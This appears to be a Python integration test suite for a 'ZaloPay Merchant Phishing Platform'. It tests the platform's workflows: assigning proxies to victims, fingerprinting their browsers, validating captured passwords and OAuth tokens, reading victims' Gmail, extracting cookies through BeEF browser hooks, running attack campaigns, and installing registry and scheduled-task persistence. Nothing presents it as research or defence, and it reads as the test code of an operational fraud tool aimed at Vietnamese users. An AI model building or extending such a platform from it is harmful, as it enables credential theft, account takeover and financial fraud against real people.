"""
Integration Tests for ZaloPay Merchant Phishing Platform
Comprehensive integration test suite for workflow testing
"""

import os
import sys
import unittest
import asyncio
import json
import time
import tempfile
import shutil
from datetime import datetime, timezone, timedelta
from unittest.mock import Mock, patch, MagicMock
import requests
import threading

# Add project root to path
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', '..'))

# Import modules to test
from backend.api.capture.proxy_manager import ProxyManager
from backend.api.capture.fingerprint import FingerprintEngine
from backend.security.encryption_manager import EncryptionManager
from backend.services.google_oauth import GoogleOAuthService
from backend.services.apple_oauth import AppleOAuthService
from backend.services.facebook_oauth import FacebookOAuthService
from backend.engines.validation.validation_pipeline import ValidationPipeline
from backend.engines.gmail.gmail_client import GmailAPIClient
from backend.engines.beef.beef_client import BeEFAPIClient
from backend.websocket.manager import ConnectionManager
from backend.engines.ml.pattern_analyzer import PatternAnalyzer
from backend.engines.advanced.multi_vector_attacker import MultiVectorAttacker
from backend.engines.advanced.persistence_manager import PersistenceManager

class TestVictimCaptureWorkflow(unittest.TestCase):
    """Integration tests for victim capture workflow"""
    
    def setUp(self):
        """Set up test fixtures"""
        self.proxy_manager = ProxyManager()
        self.fingerprint_engine = FingerprintEngine()
        self.encryption_manager = EncryptionManager()
        self.validation_pipeline = ValidationPipeline()
        
        self.test_victim_data = {
            "victim_id": "integration_test_victim_1",
            "email": "test@example.com",
            "password": "test_password_123",
            "ip_address": "192.168.1.100",
            "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "fingerprint_data": {
                "canvas_fingerprint": "test_canvas_hash_123",
                "webgl_fingerprint": "test_webgl_hash_456",
                "audio_fingerprint": "test_audio_hash_789",
                "font_list": ["Arial", "Times New Roman", "Courier New"],
                "screen_resolution": "1920x1080",
                "timezone": "Asia/Ho_Chi_Minh",
                "language": "vi-VN",
                "plugins": ["Chrome PDF Plugin", "Native Client"],
                "browser_info": {
                    "name": "Chrome",
                    "version": "91.0.4472.124",
                    "engine": "Blink"
                },
                "device_info": {
                    "type": "desktop",
                    "os": "Windows",
                    "os_version": "10"
                }
            }
        }
    
    def test_complete_victim_capture_workflow(self):
        """Test complete victim capture workflow"""
        victim_id = self.test_victim_data["victim_id"]
        
        # Step 1: Assign proxy for victim
        print(f"Step 1: Assigning proxy for victim {victim_id}")
        proxy = self.proxy_manager.assign_proxy_for_victim(victim_id)
        self.assertIsNotNone(proxy)
        self.assertIn("proxy_id", proxy)
        self.assertIn("host", proxy)
        self.assertIn("port", proxy)
        print(f"✓ Proxy assigned: {proxy['proxy_id']}")
        
        # Step 2: Process device fingerprint
        print(f"Step 2: Processing device fingerprint")
        fingerprint_result = self.fingerprint_engine.process_fingerprint_data(
            self.test_victim_data["fingerprint_data"]
        )
        self.assertIsNotNone(fingerprint_result)
        self.assertIn("fingerprint_id", fingerprint_result)
        self.assertIn("fingerprint_hash", fingerprint_result)
        print(f"✓ Fingerprint processed: {fingerprint_result['fingerprint_id']}")
        
        # Step 3: Validate credentials
        print(f"Step 3: Validating credentials")
        credential_data = {
            "email": self.test_victim_data["email"],
            "password": self.test_victim_data["password"],
            "oauth_token": "test_oauth_token_123",
            "provider": "google"
        }
        
        validation_result = self.validation_pipeline.validate_credential(credential_data)
        self.assertIsNotNone(validation_result)
        self.assertIn("is_valid", validation_result)
        self.assertIn("validation_score", validation_result)
        print(f"✓ Credentials validated: {validation_result['is_valid']}")
        
        # Step 4: Encrypt and store victim data
        print(f"Step 4: Encrypting and storing victim data")
        victim_data = {
            "victim_id": victim_id,
            "email": self.test_victim_data["email"],
            "fingerprint": fingerprint_result,
            "proxy": proxy,
            "validation": validation_result,
            "captured_at": datetime.now(timezone.utc).isoformat()
        }
        
        sensitive_data = json.dumps(victim_data)
        encrypted_data = self.encryption_manager.encrypt_data(sensitive_data)
        self.assertIsNotNone(encrypted_data)
        self.assertIn("ciphertext", encrypted_data)
        print(f"✓ Victim data encrypted and stored")
        
        # Step 5: Verify data integrity
        print(f"Step 5: Verifying data integrity")
        decrypted_data = self.encryption_manager.decrypt_data(encrypted_data)
        self.assertEqual(decrypted_data, sensitive_data)
        print(f"✓ Data integrity verified")
        
        # Step 6: Release proxy
        print(f"Step 6: Releasing proxy")
        release_result = self.proxy_manager.release_victim_proxy(victim_id)
        self.assertTrue(release_result)
        print(f"✓ Proxy released")
        
        print(f"✓ Complete victim capture workflow successful")
    
    def test_oauth_flow_integration(self):
        """Test OAuth flow integration"""
        print(f"Testing OAuth flow integration")
        
        # Initialize OAuth services
        google_oauth = GoogleOAuthService()
        apple_oauth = AppleOAuthService()
        facebook_oauth = FacebookOAuthService()
        
        # Test Google OAuth flow
        print(f"Testing Google OAuth flow")
        google_auth_url = google_oauth.get_authorization_url("test_state_google")
        self.assertIsNotNone(google_auth_url)
        self.assertIn("https://accounts.google.com/oauth/authorize", google_auth_url)
        print(f"✓ Google OAuth authorization URL generated")
        
        # Test Apple OAuth flow
        print(f"Testing Apple OAuth flow")
        apple_auth_url = apple_oauth.get_authorization_url("test_state_apple")
        self.assertIsNotNone(apple_auth_url)
        self.assertIn("https://appleid.apple.com/auth/authorize", apple_auth_url)
        print(f"✓ Apple OAuth authorization URL generated")
        
        # Test Facebook OAuth flow
        print(f"Testing Facebook OAuth flow")
        facebook_auth_url = facebook_oauth.get_authorization_url("test_state_facebook")
        self.assertIsNotNone(facebook_auth_url)
        self.assertIn("https://www.facebook.com/v18.0/dialog/oauth", facebook_auth_url)
        print(f"✓ Facebook OAuth authorization URL generated")
        
        print(f"✓ OAuth flow integration successful")

class TestGmailExploitationWorkflow(unittest.TestCase):
    """Integration tests for Gmail exploitation workflow"""
    
    def setUp(self):
        """Set up test fixtures"""
        self.gmail_client = GmailAPIClient()
        self.encryption_manager = EncryptionManager()
        self.test_oauth_token = "test_gmail_oauth_token"
    
    @patch('requests.get')
    def test_gmail_intelligence_extraction(self, mock_get):
        """Test Gmail intelligence extraction workflow"""
        print(f"Testing Gmail intelligence extraction workflow")
        
        # Mock Gmail API responses
        mock_responses = [
            # Profile response
            Mock(json=lambda: {
                "emailAddress": "test@gmail.com",
                "messagesTotal": 1000,
                "threadsTotal": 500,
                "historyId": "12345"
            }, status_code=200),
            
            # Messages list response
            Mock(json=lambda: {
                "messages": [
                    {"id": "msg1", "threadId": "thread1"},
                    {"id": "msg2", "threadId": "thread2"},
                    {"id": "msg3", "threadId": "thread3"}
                ],
                "nextPageToken": "next_token"
            }, status_code=200),
            
            # Email content response
            Mock(json=lambda: {
                "id": "msg1",
                "threadId": "thread1",
                "payload": {
                    "headers": [
                        {"name": "From", "value": "sender@example.com"},
                        {"name": "To", "value": "test@gmail.com"},
                        {"name": "Subject", "value": "Important Business Meeting"},
                        {"name": "Date", "value": "Mon, 1 Jan 2024 10:00:00 +0000"}
                    ],
                    "body": {
                        "data": "dGVzdCBlbWFpbCBib2R5IGNvbnRlbnQ="  # base64 encoded
                    }
                }
            }, status_code=200)
        ]
        
        mock_get.side_effect = mock_responses
        
        # Step 1: Get Gmail profile
        print(f"Step 1: Getting Gmail profile")
        profile = self.gmail_client.get_profile(self.test_oauth_token)
        self.assertIsNotNone(profile)
        self.assertIn("emailAddress", profile)
        print(f"✓ Gmail profile retrieved: {profile['emailAddress']}")
        
        # Step 2: List emails
        print(f"Step 2: Listing emails")
        emails = self.gmail_client.list_emails(self.test_oauth_token, max_results=10)
        self.assertIsNotNone(emails)
        self.assertIn("messages", emails)
        print(f"✓ Emails listed: {len(emails['messages'])} messages")
        
        # Step 3: Extract email content
        print(f"Step 3: Extracting email content")
        email_content = self.gmail_client.get_email(self.test_oauth_token, "msg1")
        self.assertIsNotNone(email_content)
        self.assertIn("payload", email_content)
        print(f"✓ Email content extracted")
        
        # Step 4: Encrypt extracted data
        print(f"Step 4: Encrypting extracted data")
        extracted_data = {
            "profile": profile,
            "emails": emails,
            "email_content": email_content,
            "extracted_at": datetime.now(timezone.utc).isoformat()
        }
        
        sensitive_data = json.dumps(extracted_data)
        encrypted_data = self.encryption_manager.encrypt_data(sensitive_data)
        self.assertIsNotNone(encrypted_data)
        print(f"✓ Gmail data encrypted")
        
        print(f"✓ Gmail intelligence extraction workflow successful")

class TestBeEFExploitationWorkflow(unittest.TestCase):
    """Integration tests for BeEF exploitation workflow"""
    
    def setUp(self):
        """Set up test fixtures"""
        self.beef_client = BeEFAPIClient()
        self.encryption_manager = EncryptionManager()
        self.test_session_id = "test_beef_session_1"
    
    @patch('requests.get')
    @patch('requests.post')
    def test_beef_exploitation_workflow(self, mock_post, mock_get):
        """Test BeEF exploitation workflow"""
        print(f"Testing BeEF exploitation workflow")
        
        # Mock BeEF API responses
        mock_get_responses = [
            # Sessions list response
            Mock(json=lambda: {
                "sessions": [
                    {
                        "id": self.test_session_id,
                        "ip": "192.168.1.100",
                        "browser": "Chrome",
                        "browser_version": "91.0.4472.124",
                        "os": "Windows 10",
                        "page_uri": "https://example.com",
                        "hook_session": "abc123"
                    }
                ]
            }, status_code=200),
            
            # Session details response
            Mock(json=lambda: {
                "id": self.test_session_id,
                "ip": "192.168.1.100",
                "browser": "Chrome",
                "browser_version": "91.0.4472.124",
                "os": "Windows 10",
                "page_uri": "https://example.com",
                "hook_session": "abc123",
                "commands": [
                    {"id": "cmd1", "name": "Get Browser Info", "status": "success"},
                    {"id": "cmd2", "name": "Get Cookies", "status": "success"}
                ]
            }, status_code=200)
        ]
        
        mock_post_responses = [
            # Command execution response
            Mock(json=lambda: {
                "command_id": "cmd1",
                "status": "success",
                "result": "Browser info extracted successfully"
            }, status_code=200),
            
            # Cookie extraction response
            Mock(json=lambda: {
                "command_id": "cmd2",
                "status": "success",
                "result": "Cookies extracted successfully"
            }, status_code=200)
        ]
        
        mock_get.side_effect = mock_get_responses
        mock_post.side_effect = mock_post_responses
        
        # Step 1: Get BeEF sessions
        print(f"Step 1: Getting BeEF sessions")
        sessions = self.beef_client.get_sessions()
        self.assertIsNotNone(sessions)
        self.assertIn("sessions", sessions)
        print(f"✓ BeEF sessions retrieved: {len(sessions['sessions'])} sessions")
        
        # Step 2: Get session details
        print(f"Step 2: Getting session details")
        session_details = self.beef_client.get_session(self.test_session_id)
        self.assertIsNotNone(session_details)
        self.assertIn("id", session_details)
        print(f"✓ Session details retrieved: {session_details['id']}")
        
        # Step 3: Execute reconnaissance commands
        print(f"Step 3: Executing reconnaissance commands")
        browser_info_cmd = self.beef_client.execute_command(
            self.test_session_id, 
            "get_browser_info", 
            {}
        )
        self.assertIsNotNone(browser_info_cmd)
        self.assertIn("command_id", browser_info_cmd)
        print(f"✓ Browser info command executed: {browser_info_cmd['command_id']}")
        
        # Step 4: Execute data extraction commands
        print(f"Step 4: Executing data extraction commands")
        cookie_cmd = self.beef_client.execute_command(
            self.test_session_id, 
            "get_cookies", 
            {}
        )
        self.assertIsNotNone(cookie_cmd)
        self.assertIn("command_id", cookie_cmd)
        print(f"✓ Cookie extraction command executed: {cookie_cmd['command_id']}")
        
        # Step 5: Encrypt extracted data
        print(f"Step 5: Encrypting extracted data")
        extracted_data = {
            "session_details": session_details,
            "browser_info": browser_info_cmd,
            "cookies": cookie_cmd,
            "extracted_at": datetime.now(timezone.utc).isoformat()
        }
        
        sensitive_data = json.dumps(extracted_data)
        encrypted_data = self.encryption_manager.encrypt_data(sensitive_data)
        self.assertIsNotNone(encrypted_data)
        print(f"✓ BeEF data encrypted")
        
        print(f"✓ BeEF exploitation workflow successful")

class TestWebSocketRealTimeWorkflow(unittest.TestCase):
    """Integration tests for WebSocket real-time workflow"""
    
    def setUp(self):
        """Set up test fixtures"""
        self.connection_manager = ConnectionManager()
        self.test_user_id = "test_admin_user"
        self.test_channel = "dashboard_updates"
    
    def test_realtime_dashboard_workflow(self):
        """Test real-time dashboard workflow"""
        print(f"Testing real-time dashboard workflow")
        
        # Step 1: Register WebSocket connection
        print(f"Step 1: Registering WebSocket connection")
        mock_websocket = Mock()
        self.connection_manager.register_connection(self.test_user_id, mock_websocket)
        self.assertIn(self.test_user_id, self.connection_manager.connections)
        print(f"✓ WebSocket connection registered for user: {self.test_user_id}")
        
        # Step 2: Subscribe to dashboard updates
        print(f"Step 2: Subscribing to dashboard updates")
        self.connection_manager.subscribe_to_channel(self.test_user_id, self.test_channel)
        self.assertIn(self.test_user_id, self.connection_manager.channel_subscriptions.get(self.test_channel, set()))
        print(f"✓ Subscribed to channel: {self.test_channel}")
        
        # Step 3: Broadcast victim capture notification
        print(f"Step 3: Broadcasting victim capture notification")
        victim_notification = {
            "type": "victim_captured",
            "data": {
                "victim_id": "test_victim_1",
                "email": "test@example.com",
                "timestamp": datetime.now(timezone.utc).isoformat(),
                "location": "Vietnam",
                "risk_level": "medium"
            }
        }
        
        self.connection_manager.broadcast_to_channel(self.test_channel, victim_notification)
        mock_websocket.send.assert_called()
        print(f"✓ Victim capture notification broadcasted")
        
        # Step 4: Broadcast Gmail access update
        print(f"Step 4: Broadcasting Gmail access update")
        gmail_notification = {
            "type": "gmail_access_update",
            "data": {
                "victim_id": "test_victim_1",
                "access_status": "successful",
                "emails_extracted": 150,
                "timestamp": datetime.now(timezone.utc).isoformat()
            }
        }
        
        self.connection_manager.broadcast_to_channel(self.test_channel, gmail_notification)
        print(f"✓ Gmail access update broadcasted")
        
        # Step 5: Broadcast BeEF session update
        print(f"Step 5: Broadcasting BeEF session update")
        beef_notification = {
            "type": "beef_session_update",
            "data": {
                "session_id": "beef_session_1",
                "victim_id": "test_victim_1",
                "status": "active",
                "commands_executed": 5,
                "timestamp": datetime.now(timezone.utc).isoformat()
            }
        }
        
        self.connection_manager.broadcast_to_channel(self.test_channel, beef_notification)
        print(f"✓ BeEF session update broadcasted")
        
        # Step 6: Unsubscribe from channel
        print(f"Step 6: Unsubscribing from channel")
        self.connection_manager.unsubscribe_from_channel(self.test_user_id, self.test_channel)
        self.assertNotIn(self.test_user_id, self.connection_manager.channel_subscriptions.get(self.test_channel, set()))
        print(f"✓ Unsubscribed from channel: {self.test_channel}")
        
        # Step 7: Disconnect WebSocket
        print(f"Step 7: Disconnecting WebSocket")
        self.connection_manager.disconnect_user(self.test_user_id)
        self.assertNotIn(self.test_user_id, self.connection_manager.connections)
        print(f"✓ WebSocket disconnected")
        
        print(f"✓ Real-time dashboard workflow successful")

class TestMachineLearningWorkflow(unittest.TestCase):
    """Integration tests for machine learning workflow"""
    
    def setUp(self):
        """Set up test fixtures"""
        self.pattern_analyzer = PatternAnalyzer()
        self.test_training_data = [
            {"feature1": 1, "feature2": 2, "target": "class1"},
            {"feature1": 3, "feature2": 4, "target": "class2"},
            {"feature1": 5, "feature2": 6, "target": "class1"},
            {"feature1": 7, "feature2": 8, "target": "class2"},
            {"feature1": 9, "feature2": 10, "target": "class1"}
        ]
        
        self.test_prediction_data = [
            {"feature1": 2, "feature2": 3},
            {"feature1": 4, "feature2": 5},
            {"feature1": 6, "feature2": 7}
        ]
    
    def test_ml_pattern_analysis_workflow(self):
        """Test machine learning pattern analysis workflow"""
        print(f"Testing ML pattern analysis workflow")
        
        # Step 1: Train pattern analysis model
        print(f"Step 1: Training pattern analysis model")
        model = self.pattern_analyzer.train_model("victim_behavior", self.test_training_data, "target")
        self.assertIsNotNone(model)
        self.assertIn("model_id", model)
        self.assertIn("accuracy", model)
        print(f"✓ Model trained: {model['model_id']} (accuracy: {model['accuracy']:.3f})")
        
        # Step 2: Make predictions
        print(f"Step 2: Making predictions")
        predictions = []
        for data_point in self.test_prediction_data:
            prediction = self.pattern_analyzer.predict("victim_behavior", data_point)
            self.assertIsNotNone(prediction)
            self.assertIn("prediction", prediction)
            self.assertIn("confidence", prediction)
            predictions.append(prediction)
            print(f"✓ Prediction made: {prediction['prediction']} (confidence: {prediction['confidence']:.3f})")
        
        # Step 3: Detect anomalies
        print(f"Step 3: Detecting anomalies")
        anomalies = self.pattern_analyzer.detect_anomalies(self.test_training_data, "behavioral")
        self.assertIsInstance(anomalies, list)
        print(f"✓ Anomalies detected: {len(anomalies)} anomalies")
        
        # Step 4: Analyze patterns
        print(f"Step 4: Analyzing patterns")
        pattern_analysis = self.pattern_analyzer.analyze_patterns(self.test_training_data, "victim_behavior")
        self.assertIsNotNone(pattern_analysis)
        self.assertIn("total_samples", pattern_analysis)
        self.assertIn("num_clusters", pattern_analysis)
        print(f"✓ Pattern analysis completed: {pattern_analysis['num_clusters']} clusters found")
        
        print(f"✓ ML pattern analysis workflow successful")

class TestAdvancedExploitationWorkflow(unittest.TestCase):
    """Integration tests for advanced exploitation workflow"""
    
    def setUp(self):
        """Set up test fixtures"""
        self.multi_vector_attacker = MultiVectorAttacker()
        self.persistence_manager = PersistenceManager()
        self.test_victim_id = "advanced_exploitation_victim"
    
    def test_advanced_exploitation_workflow(self):
        """Test advanced exploitation workflow"""
        print(f"Testing advanced exploitation workflow")
        
        # Step 1: Create multi-vector attack campaign
        print(f"Step 1: Creating multi-vector attack campaign")
        vector_types = ["phishing", "social_engineering", "technical_exploit"]
        attack_sequence = ["reconnaissance", "initial_access", "establishment", "escalation", "exfiltration", "persistence"]
        
        campaign_id = self.multi_vector_attacker.create_attack_campaign(
            self.test_victim_id,
            "Advanced Exploitation Campaign",
            vector_types,
            attack_sequence
        )
        self.assertIsNotNone(campaign_id)
        print(f"✓ Attack campaign created: {campaign_id}")
        
        # Step 2: Execute attack campaign
        print(f"Step 2: Executing attack campaign")
        execution_id = self.multi_vector_attacker.execute_attack_campaign(campaign_id)
        self.assertIsNotNone(execution_id)
        print(f"✓ Attack campaign executed: {execution_id}")
        
        # Step 3: Install persistence mechanisms
        print(f"Step 3: Installing persistence mechanisms")
        persistence_types = ["registry", "scheduled_task", "cookie_persistence"]
        installed_mechanisms = []
        
        for persistence_type in persistence_types:
            mechanism_id = self.persistence_manager.install_persistence(
                self.test_victim_id,
                persistence_type
            )
            if mechanism_id:
                installed_mechanisms.append(mechanism_id)
                print(f"✓ Persistence mechanism installed: {persistence_type} ({mechanism_id})")
        
        self.assertGreater(len(installed_mechanisms), 0)
        
        # Step 4: Check persistence survival
        print(f"Step 4: Checking persistence survival")
        for mechanism_id in installed_mechanisms:
            survival_check = self.persistence_manager.check_persistence_survival(mechanism_id)
            self.assertIsNotNone(survival_check)
            self.assertIn("status", survival_check)
            print(f"✓ Persistence survival checked: {mechanism_id} ({survival_check['status']})")
        
        # Step 5: Get attack status
        print(f"Step 5: Getting attack status")
        attack_status = self.multi_vector_attacker.get_attack_status(execution_id)
        self.assertIsNotNone(attack_status)
        self.assertIn("execution_id", attack_status)
        print(f"✓ Attack status retrieved: {attack_status['status']}")
        
        # Step 6: Get persistence status
        print(f"Step 6: Getting persistence status")
        persistence_status = self.persistence_manager.get_persistence_status(self.test_victim_id)
        self.assertIsNotNone(persistence_status)
        self.assertIn("victim_id", persistence_status)
        print(f"✓ Persistence status retrieved: {persistence_status['status']}")
        
        print(f"✓ Advanced exploitation workflow successful")

class TestEndToEndWorkflow(unittest.TestCase):
    """End-to-end integration tests"""
    
    def setUp(self):
        """Set up test fixtures"""
        self.proxy_manager = ProxyManager()
        self.fingerprint_engine = FingerprintEngine()
        self.encryption_manager = EncryptionManager()
        self.validation_pipeline = ValidationPipeline()
        self.gmail_client = GmailAPIClient()
        self.beef_client = BeEFAPIClient()
        self.connection_manager = ConnectionManager()
        self.pattern_analyzer = PatternAnalyzer()
        self.multi_vector_attacker = MultiVectorAttacker()
        self.persistence_manager = PersistenceManager()
    
    def test_complete_phishing_platform_workflow(self):
        """Test complete phishing platform workflow"""
        print(f"Testing complete phishing platform workflow")
        
        victim_id = "e2e_test_victim"
        
        # Phase 1: Victim Acquisition
        print(f"Phase 1: Victim Acquisition")
        
        # Assign proxy
        proxy = self.proxy_manager.assign_proxy_for_victim(victim_id)
        self.assertIsNotNone(proxy)
        print(f"✓ Proxy assigned: {proxy['proxy_id']}")
        
        # Process fingerprint
        fingerprint_data = {
            "canvas_fingerprint": "e2e_canvas_hash",
            "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "screen_resolution": "1920x1080",
            "timezone": "Asia/Ho_Chi_Minh"
        }
        
        fingerprint_result = self.fingerprint_engine.process_fingerprint_data(fingerprint_data)
        self.assertIsNotNone(fingerprint_result)
        print(f"✓ Fingerprint processed: {fingerprint_result['fingerprint_id']}")
        
        # Phase 2: Credential Capture
        print(f"Phase 2: Credential Capture")
        
        # Validate credentials
        credential_data = {
            "email": "e2e_test@example.com",
            "password": "e2e_password_123",
            "oauth_token": "e2e_oauth_token",
            "provider": "google"
        }
        
        validation_result = self.validation_pipeline.validate_credential(credential_data)
        self.assertIsNotNone(validation_result)
        print(f"✓ Credentials validated: {validation_result['is_valid']}")
        
        # Phase 3: Intelligence Extraction
        print(f"Phase 3: Intelligence Extraction")
        
        # Encrypt victim data
        victim_data = {
            "victim_id": victim_id,
            "fingerprint": fingerprint_result,
            "proxy": proxy,
            "validation": validation_result,
            "captured_at": datetime.now(timezone.utc).isoformat()
        }
        
        sensitive_data = json.dumps(victim_data)
        encrypted_data = self.encryption_manager.encrypt_data(sensitive_data)
        self.assertIsNotNone(encrypted_data)
        print(f"✓ Victim data encrypted")
        
        # Phase 4: Advanced Exploitation
        print(f"Phase 4: Advanced Exploitation")
        
        # Create attack campaign
        vector_types = ["phishing", "social_engineering"]
        attack_sequence = ["reconnaissance", "initial_access", "establishment"]
        
        campaign_id = self.multi_vector_attacker.create_attack_campaign(
            victim_id,
            "E2E Test Campaign",
            vector_types,
            attack_sequence
        )
        self.assertIsNotNone(campaign_id)
        print(f"✓ Attack campaign created: {campaign_id}")
        
        # Install persistence
        mechanism_id = self.persistence_manager.install_persistence(victim_id, "registry")
        self.assertIsNotNone(mechanism_id)
        print(f"✓ Persistence mechanism installed: {mechanism_id}")
        
        # Phase 5: Real-time Monitoring
        print(f"Phase 5: Real-time Monitoring")
        
        # Register WebSocket connection
        mock_websocket = Mock()
        self.connection_manager.register_connection("admin_user", mock_websocket)
        self.connection_manager.subscribe_to_channel("admin_user", "dashboard_updates")
        print(f"✓ WebSocket connection registered")
        
        # Broadcast updates
        notification = {
            "type": "victim_captured",
            "data": {
                "victim_id": victim_id,
                "status": "successful",
                "timestamp": datetime.now(timezone.utc).isoformat()
            }
        }
        
        self.connection_manager.broadcast_to_channel("dashboard_updates", notification)
        print(f"✓ Real-time notification broadcasted")
        
        # Phase 6: Cleanup
        print(f"Phase 6: Cleanup")
        
        # Release proxy
        release_result = self.proxy_manager.release_victim_proxy(victim_id)
        self.assertTrue(release_result)
        print(f"✓ Proxy released")
        
        # Disconnect WebSocket
        self.connection_manager.disconnect_user("admin_user")
        print(f"✓ WebSocket disconnected")
        
        print(f"✓ Complete phishing platform workflow successful")

if __name__ == '__main__':
    # Create test suite
    test_suite = unittest.TestSuite()
    
    # Add integration test cases
    test_classes = [
        TestVictimCaptureWorkflow,
        TestGmailExploitationWorkflow,
        TestBeEFExploitationWorkflow,
        TestWebSocketRealTimeWorkflow,
        TestMachineLearningWorkflow,
        TestAdvancedExploitationWorkflow,
        TestEndToEndWorkflow
    ]
    
    for test_class in test_classes:
        tests = unittest.TestLoader().loadTestsFromTestCase(test_class)
        test_suite.addTests(tests)
    
    # Run tests
    runner = unittest.TextTestRunner(verbosity=2)
    result = runner.run(test_suite)
    
    # Print summary
    print(f"\n{'='*50}")
    print(f"Integration Test Summary:")
    print(f"Tests run: {result.testsRun}")
    print(f"Failures: {len(result.failures)}")
    print(f"Errors: {len(result.errors)}")
    print(f"Success rate: {((result.testsRun - len(result.failures) - len(result.errors)) / result.testsRun * 100):.1f}%")
    print(f"{'='*50}")
    
    # Exit with appropriate code
    sys.exit(0 if result.wasSuccessful() else 1)
